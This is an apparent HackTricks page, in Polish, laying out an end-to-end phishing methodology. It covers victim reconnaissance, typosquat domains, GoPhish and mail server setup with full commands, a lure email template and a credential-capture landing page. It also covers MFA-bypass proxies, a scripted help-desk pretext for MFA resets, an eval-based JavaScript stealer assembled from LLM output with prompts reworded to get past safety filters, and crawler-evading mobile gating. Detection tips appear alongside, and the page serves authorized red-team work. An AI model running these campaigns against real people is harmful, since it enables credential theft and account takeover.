# Phishing Metodologia

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Rozpoznanie ofiary
1. Wybierz **victim domain**.
2. Wykonaj podstawową enumerację webową, **searching for login portals** używanych przez ofiarę i **decide**, który z nich będziesz **impersonate**.
3. Użyj **OSINT**, aby **znaleźć emails**.
2. Przygotuj środowisko
1. **Kup domenę** którą zamierzasz użyć do oceny phishingowej
2. **Skonfiguruj rekordy usług email** (SPF, DMARC, DKIM, rDNS)
3. Skonfiguruj VPS z **gophish**
3. Przygotuj kampanię
1. Przygotuj **email template**
2. Przygotuj **web page** do kradzieży **credentials**
4. Uruchom kampanię!

## Generowanie podobnych nazw domen lub kupno zaufanej domeny

### Techniki wariacji nazw domen

- **Keyword**: nazwa domeny **zawiera** ważne **keyword** oryginalnej domeny (np. zelster.com-management.com).
- **hypened subdomain**: Zmień **kropkę na myślnik** w subdomenie (np. www-zelster.com).
- **New TLD**: Ta sama domena z użyciem **nowego TLD** (np. zelster.org)
- **Homoglyph**: **zastępuje** literę w nazwie domeny literami, które wyglądają podobnie (np. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **zamienia miejscami dwie litery** w nazwie domeny (np. zelsetr.com).
- **Singularization/Pluralization**: Dodaje lub usuwa „s” na końcu nazwy domeny (np. zeltsers.com).
- **Omission**: **usuwa jedną** z liter z nazwy domeny (np. zelser.com).
- **Repetition:** **powtarza jedną** z liter w nazwie domeny (np. zeltsser.com).
- **Replacement**: Podobne do homoglyph, ale mniej subtelne. Zastępuje jedną z liter w nazwie domeny, np. literą znajdującą się blisko na klawiaturze (np. zektser.com).
- **Subdomained**: Wprowadza **kropkę** wewnątrz nazwy domeny (np. ze.lster.com).
- **Insertion**: **wstawia literę** do nazwy domeny (np. zerltser.com).
- **Missing dot**: Dopisuje TLD do nazwy domeny. (np. zelstercom.com)

**Automatyczne narzędzia**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Strony**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że niektóre bity przechowywane lub przesyłane zostaną automatycznie odwrócone** z powodu różnych czynników, takich jak rozbłyski słoneczne, promieniowanie kosmiczne czy błędy sprzętowe.

Kiedy ta koncepcja jest **stosowana do zapytań DNS**, możliwe, że **domena otrzymana przez serwer DNS** nie będzie taka sama jak domena pierwotnie zażądana.

Na przykład pojedyncza modyfikacja bitu w domenie "windows.com" może zmienić ją na "windnws.com."

Atakujący mogą **wykorzystać to, rejestrując wiele domen podatnych na bit-flipping**, które są podobne do domeny ofiary. Ich celem jest przekierowanie prawdziwych użytkowników do ich infrastruktury.

Po więcej informacji przeczytaj [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Kupno zaufanej domeny

Możesz wyszukać na [https://www.expireddomains.net/](https://www.expireddomains.net) wygasłą domenę, którą można wykorzystać.\
Aby upewnić się, że wygasła domena, którą zamierzasz kupić, **ma już dobrą SEO**, możesz sprawdzić, jak jest kategoryzowana w:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Odkrywanie emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **odkryć więcej** prawidłowych adresów email lub **zweryfikować te**, które już odkryłeś, możesz sprawdzić, czy możesz brute-force'ować serwery smtp ofiary. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto nie zapomnij, że jeśli użytkownicy korzystają z **jakiegokolwiek web portalu, aby uzyskać dostęp do swoich maili**, możesz sprawdzić czy jest podatny na **username brute force** i wykorzystać tę podatność, jeśli to możliwe.

## Konfiguracja GoPhish

### Instalacja

Możesz pobrać z [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz i rozpakuj to w katalogu `/opt/gophish` i uruchom `/opt/gophish/gophish`\
W wyjściu zostanie podane hasło dla użytkownika admin na porcie 3333. Dlatego uzyskaj dostęp do tego portu i użyj tych danych, aby zmienić hasło admina. Może być konieczne tunelowanie tego portu lokalnie:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed tym krokiem powinieneś mieć już zakupioną domain, której zamierzasz użyć, i musi ona wskazywać na IP VPS, na którym konfigurujesz gophish.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracja poczty**

Rozpocznij instalację: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień także wartości następujących zmiennych w pliku /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na koniec zmodyfikuj pliki **`/etc/hostname`** i **`/etc/mailname`**, ustawiając w nich swoją domenę i **zrestartuj VPS.**

Teraz utwórz **DNS A record** `mail.<domain>` wskazujący na adres IP VPS-a oraz rekord **DNS MX** wskazujący na `mail.<domain>`

Teraz przetestujmy wysłanie e-maila:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Konfiguracja Gophish**

Zatrzymaj działanie gophish i skonfigurujmy go.\

Zmień `/opt/gophish/config.json` na poniższe (zwróć uwagę na użycie https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Skonfiguruj usługę gophish**

Aby utworzyć usługę gophish tak, aby mogła być uruchamiana automatycznie i zarządzana jako usługa, możesz utworzyć plik `/etc/init.d/gophish` z następującą zawartością:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Dokończ konfigurowanie usługi i sprawdź, czy działa:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurowanie serwera pocztowego i domeny

### Poczekaj i bądź wiarygodny

Im starsza jest domena, tym mniejsze prawdopodobieństwo, że zostanie uznana za spam. Powinieneś więc czekać jak najdłużej (co najmniej 1 tydzień) przed przeprowadzeniem oceny phishingowej. Ponadto, jeśli umieścisz stronę dotyczącą sektora o dobrej reputacji, uzyskana reputacja będzie lepsza.

Zauważ, że nawet jeśli musisz poczekać tydzień, możesz teraz dokończyć konfigurację wszystkiego.

### Skonfiguruj rekord Reverse DNS (rDNS)

Ustaw rekord rDNS (PTR), który mapuje adres IP VPS na nazwę domeny.

### Rekord Sender Policy Framework (SPF)

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz użyć [https://www.spfwizard.net/](https://www.spfwizard.net) do wygenerowania polityki SPF (użyj IP maszyny VPS)

![](<../../images/image (1037).png>)

To jest zawartość, którą należy umieścić w rekordzie TXT domeny:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Musisz utworzyć nowy rekord DNS TXT wskazujący nazwę hosta `_dmarc.<domain>` z następującą zawartością:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Należy połączyć obie wartości B64, które generuje klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Sprawdź ocenę konfiguracji e-mail

Możesz to zrobić, używając [https://www.mail-tester.com/](https://www.mail-tester.com/)\ Po prostu wejdź na stronę i wyślij e-mail na adres, który Ci podadzą:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Możesz również **sprawdzić konfigurację emaila** wysyłając email na `check-auth@verifier.port25.com` i **przeczytać odpowiedź** (w tym celu będziesz musiał **otworzyć** port **25** i zobaczyć odpowiedź w pliku _/var/mail/root_, jeśli wyślesz email jako root).\
Sprawdź, czy przechodzisz wszystkie testy:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Możesz też wysłać **wiadomość na konto Gmail, którym zarządzasz**, i sprawdzić **nagłówki wiadomości e-mail** w swojej skrzynce odbiorczej Gmail, `dkim=pass` powinno być obecne w polu nagłówka `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Usuwanie z Spamhouse Blacklist

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Twoja domena jest blokowana przez spamhouse. Możesz poprosić o usunięcie swojej domeny/IP pod adresem: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Usuwanie z Microsoft Blacklist

​​Możesz poprosić o usunięcie swojej domeny/IP pod adresem [https://sender.office.com/](https://sender.office.com).

## Tworzenie i uruchamianie kampanii GoPhish

### Profil nadawcy

- Ustaw jakąś **nazwę identyfikującą** profil nadawcy
- Zdecyduj, z którego konta zamierzasz wysyłać phishing emails. Propozycje: _noreply, support, servicedesk, salesforce..._
- Możesz pozostawić puste username i password, ale upewnij się, że zaznaczono opcję Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Zaleca się użyć funkcji "**Send Test Email**" aby przetestować, czy wszystko działa.\
> Polecam **wysłać testowe e-maile na 10min mails addresses** w celu uniknięcia wpisania na czarną listę podczas testów.

### Szablon e-mail

- Ustaw jakąś **nazwę identyfikującą** szablon
- Następnie wpisz **temat** (nic dziwnego, po prostu coś, czego można by oczekiwać w zwykłym e-mailu)
- Upewnij się, że zaznaczono "**Add Tracking Image**"
- Napisz **szablon e-mail** (możesz używać zmiennych, jak w poniższym przykładzie):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Zauważ, że aby zwiększyć wiarygodność e-maila, zaleca się użyć jakiegoś podpisu z e-maila klienta. Sugestie:

- Wyślij e-mail na nieistniejący adres i sprawdź, czy odpowiedź zawiera jakiś podpis.
- Wyszukaj publiczne adresy e-mail typu info@ex.com lub press@ex.com lub public@ex.com i wyślij im e-mail, a następnie poczekaj na odpowiedź.
- Spróbuj skontaktować się z jakimś poprawnym, odnalezionym adresem e-mail i poczekaj na odpowiedź

![](<../../images/image (80).png>)

> [!TIP]
> Szablon e-maila pozwala także na dołączanie plików do wysłania. Jeśli chcesz też ukraść NTLM challenges przy użyciu specjalnie spreparowanych plików/dokumentów, przeczytaj tę stronę: (../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Wpisz nazwę
- Wpisz kod HTML strony. Zauważ, że możesz importować strony.
- Zaznacz Capture Submitted Data i Capture Passwords
- Ustaw przekierowanie

![](<../../images/image (826).png>)

> [!TIP]
> Zazwyczaj będziesz musiał zmodyfikować kod HTML strony i zrobić testy lokalnie (może z użyciem serwera Apache), aż uzyskasz oczekiwany efekt. Następnie wklej ten kod HTML do pola.\
> Jeżeli potrzebujesz użyć zasobów statycznych dla HTML (np. CSS i JS), możesz zapisać je w _**/opt/gophish/static/endpoint**_ i wtedy odwoływać się do nich z _**/static/\<filename>**_

> [!TIP]
> Dla przekierowania możesz przekierować użytkowników do legit głównej strony ofiary, lub przekierować ich do _/static/migration.html_, dodać np. kręcące się kółko ([https://loading.io/](https://loading.io)) na 5 sekund, a potem poinformować, że proces się powiódł.

### Users & Groups

- Ustaw nazwę
- Importuj dane (zwróć uwagę, że aby użyć przykładowego szablonu potrzebujesz firstname, last name i email address każdego użytkownika)

![](<../../images/image (163).png>)

### Campaign

Na koniec, utwórz kampanię wybierając nazwę, email template, landing page, URL, sending profile i group. Zauważ, że URL będzie linkiem wysyłanym do ofiar.

Zwróć uwagę, że Sending Profile pozwala wysłać testowy email, aby zobaczyć jak będzie wyglądać finalny phishing email:

![](<../../images/image (192).png>)

> [!TIP]
> Zalecam wysyłać testowe maile na adresy 10min mails, aby uniknąć zablokowania podczas testów.

Gdy wszystko jest gotowe, uruchom kampanię!

## Website Cloning

Jeśli z jakiegokolwiek powodu chcesz sklonować stronę, sprawdź następującą stronę:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

W niektórych phishingowych ocenach (głównie dla Red Teams) będziesz chciał także wysyłać pliki zawierające jakiś rodzaj backdoora (np. C2 lub coś, co wywoła uwierzytelnienie).\
Sprawdź następującą stronę dla przykładów:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Poprzedni atak jest dość sprytny, ponieważ podszywasz się pod prawdziwą stronę i zbierasz informacje wpisane przez użytkownika. Niestety, jeżeli użytkownik nie podał poprawnego hasła lub aplikacja, którą sfałszowałeś, jest skonfigurowana z 2FA, ta informacja nie pozwoli ci na podszycie się pod oszukane konto.

Tutaj przydatne są narzędzia takie jak evilginx2, CredSniper i muraena. Narzędzie pozwala wygenerować atak MitM. Zasadniczo atak działa w następujący sposób:

1. Podszywasz się pod formularz logowania prawdziwej strony.
2. Użytkownik wysyła swoje credentials do twojej fałszywej strony, a narzędzie przesyła je do prawdziwej strony, sprawdzając czy credentials działają.
3. Jeśli konto jest skonfigurowane z 2FA, strona MitM poprosi o nią i kiedy użytkownik ją wprowadzi, narzędzie przekaże ją do prawdziwej strony.
4. Gdy użytkownik zostanie uwierzytelniony, ty (atakujący) będziesz mieć captured the credentials, the 2FA, the cookie i wszelkie informacje o każdej interakcji, podczas gdy narzędzie wykonuje MitM.

### Via VNC

Co jeśli zamiast wysyłać ofiarę na złośliwą stronę wyglądającą jak oryginał, prześlesz ją do sesji VNC z przeglądarką połączoną z prawdziwą stroną? Będziesz mógł obserwować jej działania, ukraść hasło, użyte MFA, ciasteczka...\
Możesz to zrobić z EvilnVNC

## Detecting the detection

Oczywiście jedną z najlepszych metod, żeby dowiedzieć się, czy zostałeś wykryty, jest sprawdzenie swojej domeny na listach blokujących. Jeśli pojawi się na liście, w jakiś sposób twoja domena została oznaczona jako podejrzana.\
Łatwy sposób, by sprawdzić, czy twoja domena znajduje się na jakiejś liście, to użycie https://malwareworld.com/

Jednak istnieją inne metody, by dowiedzieć się, czy ofiara aktywnie szuka podejrzanych phishingowych domen w sieci, jak jest to wyjaśnione w:


{{#ref}}
detecting-phising.md
{{#endref}}

Możesz kupić domenę o bardzo podobnej nazwie do domeny ofiary i/lub wygenerować certyfikat dla subdomeny domeny kontrolowanej przez ciebie zawierającej keyword domeny ofiary. Jeśli ofiara wykona jakąkolwiek interakcję DNS lub HTTP z nimi, dowiesz się, że aktywnie poszukuje podejrzanych domen i będziesz musiał być bardzo ukryty.

### Evaluate the phishing

Użyj Phishious, żeby ocenić, czy twój e-mail trafi do folderu spam, zostanie zablokowany czy będzie skuteczny.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Nowoczesne zestawy intruzów coraz częściej pomijają wędkowanie przez e-mail i bezpośrednio celują w workflow service-desk / identity-recovery, aby pokonać MFA. Atak jest całkowicie "living-off-the-land": gdy operator uzyska ważne credentials, pivotuje za pomocą wbudowanych narzędzi administracyjnych – malware nie jest wymagane.

### Attack flow
1. Recon ofiary
* Zbieraj dane osobowe i korporacyjne z LinkedIn, wycieków danych, publicznego GitHub itp.
* Zidentyfikuj wysokowartościowe tożsamości (executives, IT, finance) i zrób enumerację exact help-desk process dla resetu hasła / MFA.
2. Real-time social engineering
* Dzwonienie, Teams lub chat do help-desk podszywając się pod cel (często ze spoofed caller-ID albo cloned voice).
* Podaj wcześniej zebrane PII, aby zdać weryfikację opartą na wiedzy.
* Przekonaj agenta, żeby zresetował MFA secret lub wykonał SIM-swap na zarejestrowanym numerze telefonu.
3. Natychmiastowe działania po dostępie (≤60 min w prawdziwych przypadkach)
* Ustanów foothold przez dowolny web SSO portal.
* Enumeruj AD / AzureAD przy użyciu wbudowanych narzędzi (bez upuszczania binarek):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ruch lateralny z WMI, PsExec, lub za pomocą legalnych RMM agentów już whitelisted w środowisku.

### Detection & Mitigation
* Traktuj help-desk identity recovery jako operację uprzywilejowaną – wymagaj step-up auth i zatwierdzenia przez managera.
* Wdroż Identity Threat Detection & Response (ITDR) / UEBA reguły, które alarmują przy:
* MFA method changed + authentication z nowego urządzenia / geo.
* Natychmiastowe podniesienie uprawnień tego samego principala (user → admin).
* Nagrywaj rozmowy help-desk i egzekwuj call-back na już zarejestrowany numer przed jakimkolwiek resetem.
* Wdróż Just-In-Time (JIT) / Privileged Access tak, aby świeżo zresetowane konta NIE dziedziczyły automatycznie tokenów o wysokich uprawnieniach.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Zespoły commodity kompensują koszty operacji high-touch masowymi atakami, które zamieniają search engines i ad networks w kanał dostawy.

1. SEO poisoning / malvertising wypycha fałszywy wynik, np. chromium-update[.]site, na szczyt reklam w wyszukiwarce.
2. Ofiara pobiera mały first-stage loader (często JS/HTA/ISO). Przykłady obserwowane przez Unit 42:
* RedLine stealer
* Lumma stealer
* Lampion Trojan
3. Loader eksfiltruje ciasteczka przeglądarki + credential DBs, potem pobiera silent loader, który decyduje – w czasie rzeczywistym – czy wdrożyć:
* RAT (np. AsyncRAT, RustDesk)
* ransomware / wiper
* komponent persistence (klucz Run w rejestrze + scheduled task)

### Hardening tips
* Blokuj nowo zarejestrowane domeny i egzekwuj Advanced DNS / URL Filtering na search-ads oraz w e-mailach.
* Ogranicz instalację oprogramowania do podpisanych MSI / pakietów ze Store, zabroń wykonywania HTA, ISO, VBS za pomocą polityk.
* Monitoruj uruchamianie instalatorów jako procesy potomne przeglądarek:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Poluj na LOLBins często nadużywane przez first-stage loadery (np. regsvr32, curl, mshta).

---

## AI-Enhanced Phishing Operations
Atakujący łańcuchują LLM & voice-clone APIs dla w pełni spersonalizowanych wabików i interakcji w czasie rzeczywistym.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

Obrona:
• Dodaj dynamiczne bannery podkreślające wiadomości wysłane z nieufnej automatyzacji (przez ARC/DKIM anomalies).  
• Wdróż voice-biometric challenge phrases dla żądań telefonicznych o wysokim ryzyku.  
• Ciągle symuluj luki generowane przez AI w programach edukacyjnych – statyczne szablony są przestarzałe.

Zobacz też – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Zobacz też – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Atakujący mogą wysłać wyglądający na nieszkodliwy HTML i wygenerować stealer w czasie wykonywania, prosząc zaufane LLM API o JavaScript, a następnie wykonując go w przeglądarce (np. eval lub dynamiczny <script>).

1. Prompt-as-obfuscation: zakoduj exfil URLs/Base64 stringi w promptcie; iteruj sposób formułowania, aby obejść filtry bezpieczeństwa i ograniczyć hallucinations.
2. Client-side API call: przy ładowaniu JS wywołuje publiczne LLM (Gemini/DeepSeek/etc.) lub CDN proxy; jedynie prompt/API call jest obecny w statycznym HTML.
3. Assemble & exec: łącz odpowiedź i wykonuj ją (polimorficznie przy każdej wizycie):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generowany kod personalizuje lure (np. LogoKit token parsing) i przesyła creds do prompt-hidden endpoint.

**Evasion traits**
- Ruch trafia do dobrze znanych domen LLM lub renomowanych CDN proxies; czasem przez WebSockets do backendu.
- Brak statycznego payloadu; złośliwy JS pojawia się dopiero po renderze.
- Generacje niedeterministyczne tworzą **unique** stealers dla każdej sesji.

**Detection ideas**
- Uruchamiaj sandboxy z włączonym JS; flaguj **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Szukaj front-end POSTs do LLM APIs natychmiast po których następuje `eval`/`Function` na zwróconym tekście.
- Generuj alerty na niezatwierdzone domeny LLM w ruchu klienta oraz następujące po nich credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Poza klasycznym push-bombingiem, operatorzy podczas rozmowy z help-desk po prostu **force a new MFA registration**, unieważniając istniejący token użytkownika. Każdy kolejny login prompt wygląda dla ofiary wiarygodnie.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitoruj zdarzenia AzureAD/AWS/Okta, w których **`deleteMFA` + `addMFA`** występują **w ciągu kilku minut z tego samego IP**.



## Clipboard Hijacking / Pastejacking

Atakujący mogą po cichu skopiować złośliwe polecenia do clipboard ofiary z kompromitowanej lub typosquatted strony internetowej, a następnie nakłonić użytkownika do wklejenia ich w **Win + R**, **Win + X** lub oknie terminala, wykonując w ten sposób dowolny kod bez pobierania plików czy załączników.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatorzy coraz częściej ukrywają swoje phishingowe przepływy za prostą kontrolą urządzenia, aby desktop crawlers nigdy nie dotarły do końcowych stron. Typowym wzorcem jest mały skrypt, który testuje, czy DOM obsługuje dotyk i wysyła wynik do server endpoint; non‑mobile clients otrzymują HTTP 500 (lub pustą stronę), podczas gdy użytkownicy mobilni otrzymują pełny przepływ.

Minimalny fragment klienta (typowa logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (uproszczona):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Zachowanie serwera często obserwowane:
- Ustawia cookie sesyjne przy pierwszym ładowaniu.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (lub zastępczą odpowiedź) na kolejne GETy gdy `is_mobile=false`; serwuje phishing tylko jeśli `true`.

Heurystyki wyszukiwania i wykrywania:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Telemetria webowa: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla nie‑mobilnych; legalne ścieżki dla mobilnych ofiar zwracają 200 z dalszym HTML/JS.
- Blokuj lub dokładnie analizuj strony, które uzależniają zawartość wyłącznie od `ontouchstart` lub podobnych testów urządzenia.

Porady obronne:
- Uruchamiaj crawlery z fingerprintami przypominającymi mobile i włączonym JS, aby ujawnić zawartość chronioną.
- Wysyłaj alerty o podejrzanych odpowiedziach 500 po `POST /detect` na nowo zarejestrowanych domenach.

## Źródła

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
